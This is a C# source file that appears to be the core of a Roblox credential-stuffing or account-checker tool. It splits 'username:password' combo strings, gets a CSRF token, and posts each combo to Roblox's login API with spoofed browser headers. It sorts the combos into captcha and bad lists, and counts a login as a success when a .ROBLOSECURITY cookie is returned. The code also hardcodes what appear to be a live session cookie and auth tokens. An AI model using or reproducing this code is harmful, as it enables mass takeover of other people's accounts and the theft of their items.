namespace robloxservice;

using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Net.Http.Headers;
using Newtonsoft.Json;

public class robloxservice
{
    public static async Task<bool> xsrf(HttpClient client, string combo)
    {
        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
        long ts = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        long timeframe = ts - (ts % 21600);
        var split_combo = combo.Split(":");
        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "https://auth.roblox.com/v2/login");
        request.Headers.Add("authority", "auth.roblox.com");
        request.Headers.Add("accept", "application/json, text/plain, */*");
        request.Headers.Add("accept-language", "en-US,en;q=0.9");
        request.Headers.Add("cookie", "GuestData=UserID=-1439651714; _gcl_au=1.1.962590408.1710552524; RBXSource=rbx_acquisition_time=3/15/2024 8:28:57 PM&rbx_acquisition_referrer=https://www.roblox.com/?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1561093%2Fprofile%3FfriendshipSourceType%3DPlayerSearch&rbx_medium=Direct&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1; __utmz=200924205.1710552548.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); rbx-ip2=; __utmc=200924205; __utma=200924205.36154032.1710552548.1710961405.1710963514.10; __utmb=200924205.0.10.1710963514; RBXEventTrackerV2=CreateDate=3/20/2024 2:38:59 PM&rbxid=453156&browserid=221076863136; .ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_1E803187F2C5CDC9F8BF3C94EB0C656F629F1219DD1A3C536D566E7B96B67C8FCB963E09A3CCF5FAD05A06814284A8DD38AC2CE27713D80C4DBAA48847DDC5EE6457B92205491A5C3A0D0D1FF06B55CA5981A59F5EBE2A1685DCF867A4332BF87CDFEE209E5C067DCF79C8EF9B2E65FBBFDA464E43927AB227E79888CFD040F5D6C0B30A0C8F246546B957FD32D693E7CD33C34026B9A8DAC3075C1AC917646310F7E81589D23B06E1BEC0D201421FC3E42F95622DFFCF4291E2EA3AC53A81846FCD11D08D1A3EBAF1FF27AEA9373EDB7BBDD5279CA91558639A033F07EB17360F29B7B3B505C420C5DE068DE7EE9F8B47B545E3B78D9BD7A4D1B0ABA152A4E620E935B69CEB3E28C3DB7704E9CC1A9FDC83B5445B06A0C4FD169C9205FEF55DDA09AC49D76EE44433B23DDE1E26C0F315A1948DDD6322173C7881B94C849E8CB3B5934FA359CF00F5503147814ACD3105DAD8791EF6CE57262438BCB07A4C789C48E89C5A3630B82D29E814EBE1D33B95BD3D3873545C922B1687AAE4FCBC1067D8D37EE80AC54E5E02D6C2BE8AEA664428B133FBBB86686501D798B39C8B1DC1DCE7A5D092BA7F01F4F07A1C6FC8480DD96205E4318437299159CDCC256F1FFB838F34A689343B6FC90C63E650B84C679D814684BA6B1DA658375DA60A247133104F76E8CD5860CFA1F54E55551EB3D1E41A8869EED63BCD5BDBECE1646A6EC1D63728137392A34D40A593D3CF4D8974FCA4F136BAE28A70D822488E9BC962156BE69BB39CA2C575E3CDEDEB1CFF25C95AB0397C73E47FFD43257A78636D71CFC7A76B68A3DF2FE3CB07F1552CFEFB59F62A04905C2A2572202A3DAE0414753F635394A2DD8C2A0E88230530D822BB96DD9DE1196A0C1415677039888481CF84326B954218EF1F4063C7024209BD1ED72B665CB999EA339A09550DFE70BD4525E29612B6D8BD6A877C81D6F27A21919BF68FEB4F8F6BC0C877B1049FDC7291C38D372CEF0CA8571AC3D4020E1B5FE97A7A9320B22C4ACBF1619DC6C54E0650D56AF73D1A1562FDE9DD25DB65E29680E929B52B; rbxas=69a5947ac702ce53e0327bd788d5c30b397f6072ce48eda0718ef8564efb4378; RBXSessionTracker=sessionid=b9c0e2b1-a848-49df-92fc-f25cc7ad7f21");
        request.Headers.Add("origin", "https://www.roblox.com");
        request.Headers.Add("referer", "https://www.roblox.com/");
        request.Headers.Add("sec-ch-ua", "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"");
        request.Headers.Add("sec-ch-ua-mobile", "?0");
        request.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
        request.Headers.Add("sec-fetch-dest", "empty");
        request.Headers.Add("sec-fetch-mode", "cors");
        request.Headers.Add("sec-fetch-site", "same-site");
        request.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36");
        request.Headers.Add("x-bound-auth-token", "7nCOTRhERkMD0SLRVxSZtx0mCVbmbfXB6ipBLPpBW2A=|1710908770|M7pSe84WwXMquCaZxv/tFFvGQLMkxPqvENjziv2Jr+N2uv8tTyVMdn4/D9NG678Bgy3ThIP16AmkrTWR27zfIA==");
        var data = new Dictionary<string, object>
        {                
            { "accountBlob", "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" },
            { "ctype", "Username" },
            { "cvalue", split_combo[0].ToString() },
            { "password", split_combo[1] },

        };

        // Serialize the dictionary to JSON
        var json = JsonConvert.SerializeObject(data);
        request.Content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");
        
        var response = await client.SendAsync(request);
        var responseJson = await response.Content.ReadAsStringAsync();
        Console.WriteLine();
        var responseObject = JsonConvert.DeserializeObject<Dictionary<string, object>>(responseJson);
        if(response.Headers.TryGetValues("X-Csrf-Token", out IEnumerable<string> locationHeaders))
        {
            string locationHeaderValue = string.Join(", ", locationHeaders);
            bool responses = await try_login(client, combo, locationHeaderValue);
            return responses;
        }
        return false;
    }

    public static async Task<bool> try_login(HttpClient client, string combo, string xsrf)
    { 
        long ts = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        long timeframe = ts - (ts % 21600);
        var split_combo = combo.Split(":");
        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "https://auth.roblox.com/v2/login");
        request.Headers.Add("authority", "auth.roblox.com");
        request.Headers.Add("accept", "application/json, text/plain, */*");
        request.Headers.Add("accept-language", "en-US,en;q=0.9");
        request.Headers.Add("cookie", "GuestData=UserID=-1439651714; _gcl_au=1.1.962590408.1710552524; RBXSource=rbx_acquisition_time=3/15/2024 8:28:57 PM&rbx_acquisition_referrer=https://www.roblox.com/?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1561093%2Fprofile%3FfriendshipSourceType%3DPlayerSearch&rbx_medium=Direct&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1; __utmz=200924205.1710552548.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); rbx-ip2=; __utmc=200924205; __utma=200924205.36154032.1710552548.1710961405.1710963514.10; __utmb=200924205.0.10.1710963514; RBXEventTrackerV2=CreateDate=3/20/2024 2:38:59 PM&rbxid=453156&browserid=221076863136; .ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_1E803187F2C5CDC9F8BF3C94EB0C656F629F1219DD1A3C536D566E7B96B67C8FCB963E09A3CCF5FAD05A06814284A8DD38AC2CE27713D80C4DBAA48847DDC5EE6457B92205491A5C3A0D0D1FF06B55CA5981A59F5EBE2A1685DCF867A4332BF87CDFEE209E5C067DCF79C8EF9B2E65FBBFDA464E43927AB227E79888CFD040F5D6C0B30A0C8F246546B957FD32D693E7CD33C34026B9A8DAC3075C1AC917646310F7E81589D23B06E1BEC0D201421FC3E42F95622DFFCF4291E2EA3AC53A81846FCD11D08D1A3EBAF1FF27AEA9373EDB7BBDD5279CA91558639A033F07EB17360F29B7B3B505C420C5DE068DE7EE9F8B47B545E3B78D9BD7A4D1B0ABA152A4E620E935B69CEB3E28C3DB7704E9CC1A9FDC83B5445B06A0C4FD169C9205FEF55DDA09AC49D76EE44433B23DDE1E26C0F315A1948DDD6322173C7881B94C849E8CB3B5934FA359CF00F5503147814ACD3105DAD8791EF6CE57262438BCB07A4C789C48E89C5A3630B82D29E814EBE1D33B95BD3D3873545C922B1687AAE4FCBC1067D8D37EE80AC54E5E02D6C2BE8AEA664428B133FBBB86686501D798B39C8B1DC1DCE7A5D092BA7F01F4F07A1C6FC8480DD96205E4318437299159CDCC256F1FFB838F34A689343B6FC90C63E650B84C679D814684BA6B1DA658375DA60A247133104F76E8CD5860CFA1F54E55551EB3D1E41A8869EED63BCD5BDBECE1646A6EC1D63728137392A34D40A593D3CF4D8974FCA4F136BAE28A70D822488E9BC962156BE69BB39CA2C575E3CDEDEB1CFF25C95AB0397C73E47FFD43257A78636D71CFC7A76B68A3DF2FE3CB07F1552CFEFB59F62A04905C2A2572202A3DAE0414753F635394A2DD8C2A0E88230530D822BB96DD9DE1196A0C1415677039888481CF84326B954218EF1F4063C7024209BD1ED72B665CB999EA339A09550DFE70BD4525E29612B6D8BD6A877C81D6F27A21919BF68FEB4F8F6BC0C877B1049FDC7291C38D372CEF0CA8571AC3D4020E1B5FE97A7A9320B22C4ACBF1619DC6C54E0650D56AF73D1A1562FDE9DD25DB65E29680E929B52B; rbxas=69a5947ac702ce53e0327bd788d5c30b397f6072ce48eda0718ef8564efb4378; RBXSessionTracker=sessionid=b9c0e2b1-a848-49df-92fc-f25cc7ad7f21");
        request.Headers.Add("origin", "https://www.roblox.com");
        request.Headers.Add("x-csrf-token", xsrf);
        request.Headers.Add("referer", "https://www.roblox.com/");
        request.Headers.Add("sec-ch-ua", "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"");
        request.Headers.Add("sec-ch-ua-mobile", "?0");
        request.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
        request.Headers.Add("sec-fetch-dest", "empty");
        request.Headers.Add("sec-fetch-mode", "cors");
        request.Headers.Add("sec-fetch-site", "same-site");
        request.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36");
        request.Headers.Add("x-bound-auth-token", "7nCOTRhERkMD0SLRVxSZtx0mCVbmbfXB6ipBLPpBW2A=|1710908770|M7pSe84WwXMquCaZxv/tFFvGQLMkxPqvENjziv2Jr+N2uv8tTyVMdn4/D9NG678Bgy3ThIP16AmkrTWR27zfIA==");
        var data = new Dictionary<string, object>
        {
            { "accountBlob", "SMAtVb9uh4w1DYDh92kcLtbir0t4ghKJxnj5rDkm51bpKJz7vhNAE3EVuWhdDalSCeg6aKVdf4RZE5It6JDhMePrbNCM6e6MAd/Hzx1YegGTUX1isC4rAXGJPkDzg+sdCV1RTfrv57uykJ+mxhP+7kvDbfT2vYU0aow0F/KSD2JUEyHheJrmTQqNYvVtcZ8SUGvD8w0fApJUVS8brzNfxbMBzb8ItiRddZy97NHYxidnRuOvDh9U1/F7FG5DBHW2ZBr7NifaQCodbzg4KObE3lO8VAoC1Jqwh1Pj3Tq00c6aciKHFHM018O10OcpeaCeYpXt/84jXh8yriNfyAx4FbP/MbGcE7DcmCgZ12HdWLd4USqGUAkYKuklwtHVgSqGAB4w8ij+dZ0moNWgQssRP9cvJoDDgzcidFxq1N9t3solH52KiI+z1XnCsN4Nx/Dcrn7yq/i8NHAw/y4xve2oIWQapO4IHrBD94RHARIOe9gcpKgAzYSWFOyY1sZZ/x4w++DeusKiDf0tmGKejIeL50rxdkyua9aOLXJ4+u2hid7S4HRrO/2hesFHqzr0gnvY1k4I2S3jTOCdtQXPPlexR4bAgdtb6notrk1vGA4W51ix/4FE67rcYSkcrJXVd2gY493SKl5y49D9oDr+4hsj1wDANeTWIg6/x+D2QprGWKWEgNgjTXE47FxjwA/FrW/UnkSpX7MP1w3rVpRamF1AUERH2hsTTs0kupnQ7Ogou32HorX2auoLY2HeZkNGmtKK1uoY5yfK2WCYhrXHEv0yPZFrTzDxGLZrbqvrXzUtT8r3ueTziyfFBHh1/7vNslg1MDqEfBrn2ZDV05ybuTbrR0PVfbvB3X4CcuM/0sONg51IVpqvbq++evYQGTvxScSw5N36/7s06++PgNk9pMRt6crAXfo2/2TN9XhqF/RNQtyyI9JtIKX1F7cGDPzpWFrdTzLDsbxCvNmIHRT/p37lQnaSRa9XmvHhZt4F6Br5nP6xxyogpe9JGXd6mSqoQKvkCK9p3XJfIgQWgEEDn1q7SheSQiuABaleYRwetRxkufBO4aYipZrVzEJLE0V8k64/klKDSc+mkWVOJQz0fpcJ46Ira6dm2fkXpdwqWZUWDJBEL9RqWJygG0RLOdBKRPVKqjhndZpz0HDDupCg/BipRC/4kvMHhg3S7gZPSpeVGRIMXHN5XQ9EhuNgCwT/7xuQ26IUotK3KxKCtZa88jy2itqecS6lT7/hYOta+D4uCRQv9el8hamaBLIOi7OVXHKO52YP9Vudv4WHZddhsIFmlIgtoR5i6wLNqG7wnzzcW6sJhHyy+HxP/qefwxd3ixbQa+H0GdWJzzX0VA4iTYWKrUo+D7RdjHnTsdLk6B2GnZdbaYwIL6wsSXMkBAc3HkZsnxGEP8Qd3qWB+mJzI/ceqRY5osGmOTMvIX7ijX57KoFe2oUTuIRiIhsSVeQdm0vxJSaCWkzpv7T0K5V0uJraeTuvwiIMpnJFPE/hmauzYF2gz2F9VIAkcjVOGluYfrFgdRYbajKH+++SgQgO7NKTdI1ocnnue4PKAtr8kgOoUyXFV3nVtsAPlmorZGywyzYAXMx9TbO76WSQm53l6XVTP18+VbLoZ9+k5P522nnTtWWbXu5OLLI21RL3THYQehVnWz+e2EREFvDaMGDcp7naWvyy3BPGvxEzffwCVHInn+8q29UV090UICawgUVYMW8zAd8hGXnkcSSzmeH9SYyh7Z20QloIFuJrJwHN06Q4iaXS7TroqS6EqY0+lyzjSC4A9DXxELBQ3iFNIgPl8BYuu5wn/o/gW6KaDP9dW5ffEB7/2ciPcblTXxbT/eAnIeqaNjDCzlWKY4074C/3Qq+CPxuZxV5yfp4fmE6b1w/5m+utBTe7akZf3wNAcV8ZUF0bkZqmgqmpkVxqOyH5Gg0gspDLuyZQchmFG4O6eRUCpnFlOEdt+tb2puYVyK5GwQGd1B2rb0+c/ezMut/2E7n2b05rpWt32uCbm0QzJsu0U/r/I04x3UKHuAw2YbdgUmJ/1ecvW0EO60t5ZhqFVVEN/B7hnkVHtbuPQ2rKU62XjqblwjD+8oiiv2plwvYCyuyUwdUfCrgSITJi8F5aVgtwF8EZM1aIPqVHAK5fhnOHUMcN6tsPX4zVNmVA7V8GqIbbJHLqg++6YPMQFzt4CZ4gmRCgxbNrP0PI1zckQxHtsASbsB62h+HV+pnlDjd2pMDx++qvVPfUI90pTqbrvZP/RNb9Wbzzri/k4zqzxCr0QDe56v+AThJZxweA2mo6LvHz1/D9+XiuZC7iHRbr1FL7hPZs4GzvjBIr+A6aCoT6qWn+89DcWmpnvRQ819ndDE8RGcw051nfdM5qc5rEHLaue/3vExjA+LlZKD6qFNLndGzKC+B3z5XLofFWOyrmzouGD5mS8ac+xBW6tfYJMJdKT/BUxdiiCTWxM9Cylf7YH0RYG1IUIDLS2DW1Q+VmSbngKVpjGm3a82UcwLgfRfeU4dROXDQd+tgah6P3ZqZb6GD2NjwDeC1RHrsHmwhxO9pyHkVB7NUWW4mz6nLl92CqQeeiP6gYkLYiR1u/jxN+rCr9psrQcfXyzbJuHKyec1TiPnP33VMRVxqrAHIqfsk3ke4AtT761lvZKbriiE326IAUvMfQsA==" },
            { "ctype", "Username" },
            { "cvalue", split_combo[0].ToString() },
            { "password", split_combo[1] },
        };

        // Serialize the dictionary to JSON
        var json = JsonConvert.SerializeObject(data);
        request.Content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");
        
        var response = await client.SendAsync(request);
        var responseJson = await response.Content.ReadAsStringAsync();
        Console.WriteLine(responseJson);
        if (response.Headers.TryGetValues("rblx-challenge-metadata", out IEnumerable<string> challengeMetadataValues))
        {
            {
                using (StreamWriter writer = File.AppendText("data/captcha.txt"))
                {
                    writer.WriteLine($"{split_combo[0]}:{split_combo[1]}");
                }
            }
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Captcha: True");
            Console.ResetColor();
            return false;
        }
        var responseObject = JsonConvert.DeserializeObject<Dictionary<string, object>>(responseJson);
        if (response.Headers.TryGetValues("Set-Cookie", out IEnumerable<string> cookieValues))
        {
            foreach (var cookieValue in cookieValues)
            {
                if (cookieValue.Contains(".ROBLOSECURITY"))
                {
                    return true;
                }
            }
        }
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("captcha: false"  );
        Console.ResetColor();
        using (StreamWriter writer = File.AppendText("data/bad.txt"))
        {
            writer.WriteLine($"{split_combo[0]}:{split_combo[1]}");
        }
        return false;
    }
}